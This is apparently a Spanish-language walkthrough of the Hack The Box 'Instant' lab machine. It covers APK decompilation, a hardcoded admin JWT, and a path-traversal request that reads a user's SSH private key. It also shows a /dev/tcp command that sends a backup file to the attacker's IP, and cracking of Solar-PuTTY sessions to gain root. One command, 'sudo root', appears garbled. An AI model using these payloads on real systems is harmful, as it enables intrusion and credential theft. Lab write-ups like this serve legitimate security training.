-----
## Conexión a la VPN

Primero, nos conectamos a la VPN de Hack The Box (HTB) utilizando las credenciales proporcionadas.

### Verificando Conectividad

Para comprobar que tenemos conectividad con la máquina objetivo, realizamos un `ping` y observamos que el TTL es 63. Esto generalmente indica que la máquina está ejecutando un sistema operativo basado en Linux en entornos controlados como HTB.

```bash
ping <IP_de_la_máquina>
```

## Escaneo de Puertos

Realizamos un escaneo completo de puertos para identificar los servicios abiertos en la máquina:

```bash
sudo nmap -p- -sCV --open --min-rate=500 -n -vvv -Pn <IP_de_la_máquina> -oG escaneo
```

También realizamos un escaneo dirigido a los puertos 22 (SSH) y 80 (HTTP):

```bash
sudo nmap -sCV -p22,80 10.10.11.37 -oN targeted
```

## Configuración del Dominio

Para interpretar el dominio en nuestro navegador, lo agregamos al archivo `/etc/hosts` de nuestra máquina local:

```bash
echo "10.10.11.37 instant.htb" | sudo tee -a /etc/hosts
```

Ahora, al ingresar `instant.htb` en el navegador, ya no nos redirige a la página de inicio y muestra un botón para descargar un archivo APK.

## Análisis del Archivo APK

Descargamos el archivo APK y lo analizamos utilizando la herramienta `apktool` para descompilarlo:

```bash
apktool d instant.apk
```

Usamos `tree` para examinar la estructura de directorios y localizamos el archivo `strings.xml` en el que podríamos encontrar información sensible:

```bash
cat res/values/strings.xml
```

A continuación, filtramos por "instant.htb" para encontrar subdominios y otros detalles:

```bash
grep -r "instant.htb"
```

### Agregamos los Subdominios a /etc/hosts

Encontramos los subdominios `swagger-ui.instant.htb` y `mywalletv1.instant.htb` y los agregamos a nuestro archivo `/etc/hosts`:

```bash
echo "10.10.11.37 swagger-ui.instant.htb mywalletv1.instant.htb" | sudo tee -a /etc/hosts
```

### Accediendo a la API

Accedemos a `swagger-ui.instant.htb` para examinar los endpoints disponibles. Descubrimos que podemos enviar solicitudes POST a la API en `api/v1/admin/read/log`.

Al intentar obtener información de los logs, la API solicita una clave `APIKEY` que aún no poseemos. Por lo tanto, buscamos alguna cadena útil en el código fuente.
![[Pasted image 20250310225504.png]]
## Obtención del Token JWT

Revisamos el archivo `activity_forgot_password.xml` y encontramos un posible endpoint de autenticación, además de una cadena que parece un token JWT:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

Utilizamos [jwt.io](https://jwt.io/) para decodificar el token y obtener más información. Este token se usará para autenticar nuestras solicitudes a la API.

### Realizando una Solicitud Autenticada

Una vez autenticados con el token JWT, accedemos a los logs y obtenemos la información relevante.

![[Pasted image 20250310225616.png]]

## Acceso SSH con la Clave Privada

Al explorar los archivos de la máquina víctima, encontramos una clave privada SSH en el archivo `id_rsa` dentro de los logs. Usamos `curl` para obtener el contenido del archivo y lo guardamos en un archivo local:

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq '.["/home/shirohige/logs/../../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//' > id_rsa
```

Concedemos permisos al archivo `id_rsa` y nos conectamos por SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa shirohige@<IP_de_la_victima>
```

Ahora tenemos acceso al servidor y podemos leer la primera bandera.

## Escalando Privilegios

Realizamos algunos intentos para escalar privilegios, pero no encontramos información útil en los comandos `sudo -l`, `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`, ni `ps -faux`. Sin embargo, encontramos un archivo interesante en `/opt/backups/Solar-PuTTY`.

### Descifrando el Archivo Base64

Dentro de `/opt/backups/Solar-PuTTY`, encontramos un archivo `sessions-backup.dat` que parece estar en base64. Utilizamos un script de GitHub para descifrarlo.

- **Repositorio para descifrar**: [GitHub Gist](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5)

Primero, descargamos el script:

```bash
curl -O https://gist.githubusercontent.com/xHacka/052e4b09d893398b04bf8aff5872d0d5/raw/8e76153cd2d115686a66408f6e2deff7d3740ecc/SolarPuttyDecrypt.py
```

Ejecutamos el script para descifrar el archivo:

```bash
python3 SolarPuttyDecrypt.py
```

### Enviando el Archivo Descifrado

Utilizamos `nc` para escuchar el puerto 443 y enviar el archivo de la máquina víctima a nuestra consola:

```bash
cat < sessions-backup.dat /dev/tcp/10.10.16.29/443
```

En nuestra consola:

```bash
nc -nlvp 443 > session-backup.dat
```

Luego, ejecutamos el script para intentar encontrar la contraseña:

```bash
python3 SolarPuttyDecrypt.py session-backup.dat /usr/share/wordlist/rockyou.txt | tail -n 1 | jq
```
![[Pasted image 20250311005201.png]]
Una vez que encontramos la contraseña **Estrella**, la usamos para iniciar sesión como root:

```bash
sudo root
```

### Obteniendo la Segunda Bandera

Finalmente, ejecutamos los siguientes comandos para obtener la segunda bandera:

```bash
cd
cat root.txt
```

Y hemos terminado la máquina.

---

